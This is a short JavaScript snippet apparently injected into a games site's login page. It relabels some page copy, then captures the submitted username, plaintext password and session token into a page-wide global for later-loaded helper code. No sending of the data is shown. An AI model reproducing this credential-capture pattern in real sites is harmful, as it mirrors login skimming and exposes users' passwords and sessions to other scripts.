(() => {
  "use strict";

  if (window.__learningZonesLoginHandoffInstalled) return;
  window.__learningZonesLoginHandoffInstalled = true;
  if ((location.pathname.replace(/\/+$/, "") || "/") !== "/login") return;

  function normalizeLoginCopy() {
    const form = document.querySelector('[data-testid="login-form"]');
    if (!form) return false;
    document.querySelectorAll("p").forEach(paragraph => {
      if (paragraph.textContent?.includes("3,989 games")) {
        paragraph.textContent = paragraph.textContent.replace("3,989 games", "3,989 zones");
      }
    });
    return true;
  }

  const copyObserver = new MutationObserver(() => {
    if (normalizeLoginCopy()) copyObserver.disconnect();
  });
  copyObserver.observe(document.documentElement, { childList: true, subtree: true });
  normalizeLoginCopy();

  function captureCredential(form) {
    if (!form?.matches?.('[data-testid="login-form"]')) return;
    const username = String(form.querySelector('[data-testid="username-input"], input[autocomplete="username"]')?.value || "").trim();
    const password = String(form.querySelector('[data-testid="password-input"], input[type="password"]')?.value || "");
    if (!username || !password) return;
    let sessionAtCapture = "";
    try {
      sessionAtCapture = localStorage.getItem("ugp_session") || "";
    } catch (error) {}
    window.__learningZonesPendingLoginCredential = {
      username,
      password,
      capturedAt: Date.now(),
      sessionAtCapture
    };
  }

  document.addEventListener("submit", (event) => captureCredential(event.target), true);

  const startedAt = Date.now();
  const helperTimer = window.setInterval(() => {
    const path = location.pathname.replace(/\/+$/, "") || "/";
    const loginFinished = path !== "/login";
    const backgroundDeadlineReached = Date.now() - startedAt >= 3500;
    if (!loginFinished && !backgroundDeadlineReached) return;
    window.clearInterval(helperTimer);
    if (typeof window.learningZonesLoadHelpers === "function") {
      window.setTimeout(window.learningZonesLoadHelpers, loginFinished ? 80 : 0);
    }
  }, 100);

  window.addEventListener("pagehide", () => copyObserver.disconnect(), { once: true });
})();
